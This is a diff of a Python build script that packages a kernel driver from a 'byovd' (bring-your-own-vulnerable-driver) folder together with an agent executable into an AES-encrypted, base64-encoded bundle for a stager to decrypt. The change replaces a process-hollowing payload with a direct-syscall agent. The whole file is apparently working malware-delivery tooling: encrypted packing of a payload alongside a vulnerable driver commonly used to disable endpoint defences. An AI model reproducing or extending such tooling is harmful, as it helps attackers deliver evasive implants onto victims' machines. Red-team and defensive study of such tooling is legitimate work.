@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # build_bundle.py
-# Packages driver.sys + payload.exe into the JCKY bundle format,
+# Packages driver.sys + jocky_agent.exe into the JCKY bundle format,
 # AES-256-CBC encrypts it, base64 encodes it, and writes bundle.bin.
 #
 # Usage:
 #   python build_bundle.py
-#   python build_bundle.py path/to/driver.sys path/to/payload.exe path/to/out.bin
+#   python build_bundle.py path/to/driver.sys path/to/jocky_agent.exe path/to/out.bin
 #
 # Reads JOCKY_AES_KEY from endpoint-management-server/.env automatically.
 # Requires: pip install pycryptodome
@@ -32,25 +32,25 @@ def load_env(path=".env"):
 MAGIC   = b"JCKY"
 VERSION = 0x01
 
-TYPE_DRIVER  = 0x01
-TYPE_PAYLOAD = 0x03
+TYPE_DRIVER = 0x01
+TYPE_AGENT  = 0x04
 
 # BundleHeader: magic(4) + version(1) + num_files(1) + reserved(10) = 16 bytes
 HEADER_SIZE = 16
 # BundleEntry:  type(1)  + size(4)   + offset(8)                    = 13 bytes
 ENTRY_SIZE  = 13
 
-def build_bundle(driver_path, payload_path, out_path, aes_key_bytes):
+def build_bundle(driver_path, agent_path, out_path, aes_key_bytes):
     from Crypto.Cipher import AES
     from Crypto.Util.Padding import pad
     from Crypto.Random import get_random_bytes
 
-    driver_data  = open(driver_path,  "rb").read()
-    payload_data = open(payload_path, "rb").read()
+    driver_data = open(driver_path, "rb").read()
+    agent_data  = open(agent_path,  "rb").read()
 
     files = [
-        (TYPE_DRIVER,  driver_data),
-        (TYPE_PAYLOAD, payload_data),
+        (TYPE_DRIVER, driver_data),
+        (TYPE_AGENT,  agent_data),
     ]
     num_files = len(files)
 
@@ -73,7 +73,7 @@ def build_bundle(driver_path, payload_path, out_path, aes_key_bytes):
 
     plaintext = header + table + data
 
-    # AES-256-CBC: prepend random IV (matches agent/stager decrypt convention)
+    # AES-256-CBC: prepend random IV (matches stager decrypt convention)
     iv         = get_random_bytes(16)
     cipher     = AES.new(aes_key_bytes, AES.MODE_CBC, iv)
     ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))
@@ -84,25 +84,27 @@ def build_bundle(driver_path, payload_path, out_path, aes_key_bytes):
     with open(out_path, "wb") as f:
         f.write(encoded)
 
+    names = {TYPE_DRIVER: "driver.sys", TYPE_AGENT: "jocky_agent.exe"}
     print(f"[+] Bundle built successfully")
     print(f"    Plaintext:  {len(plaintext):,} bytes")
     print(f"    Encrypted:  {len(ciphertext):,} bytes")
     print(f"    Encoded:    {len(encoded):,} bytes  → {out_path}")
     print(f"[+] Components:")
-    names = {TYPE_DRIVER: "driver.sys", TYPE_PAYLOAD: "payload.exe"}
+    cur = data_start
     for ftype, fdata in files:
-        print(f"    {names[ftype]:<12} {len(fdata):>8,} bytes  (offset {data_start if ftype == TYPE_DRIVER else data_start + len(driver_data)})")
+        print(f"    {names[ftype]:<16} {len(fdata):>8,} bytes  (offset {cur})")
+        cur += len(fdata)
 
 def main():
     # Defaults
-    driver_path  = "byovd/driver/driver.sys"
-    payload_path = "processhollowing/payload.exe"
-    out_path     = "bundle.bin"
+    driver_path = "byovd/driver/driver.sys"
+    agent_path  = "directSyscall/jocky_agent.exe"
+    out_path    = "bundle.bin"
 
     if len(sys.argv) == 4:
-        driver_path, payload_path, out_path = sys.argv[1], sys.argv[2], sys.argv[3]
+        driver_path, agent_path, out_path = sys.argv[1], sys.argv[2], sys.argv[3]
     elif len(sys.argv) != 1:
-        print("Usage: python build_bundle.py [driver.sys client.exe payload.exe bundle.bin]")
+        print("Usage: python build_bundle.py [driver.sys jocky_agent.exe out.bin]")
         sys.exit(1)
 
     # Load AES key from .env
@@ -116,14 +118,13 @@ def main():
         sys.exit(1)
     aes_key = bytes.fromhex(key_hex)
 
-    # Validate inputs
-    for path in (driver_path, payload_path):
+    for path in (driver_path, agent_path):
         if not os.path.exists(path):
             print(f"[-] Not found: {path}")
             sys.exit(1)
 
     try:
-        build_bundle(driver_path, payload_path, out_path, aes_key)
+        build_bundle(driver_path, agent_path, out_path, aes_key)
     except ImportError:
         print("[-] Missing dependency: pip install pycryptodome")
         sys.exit(1)
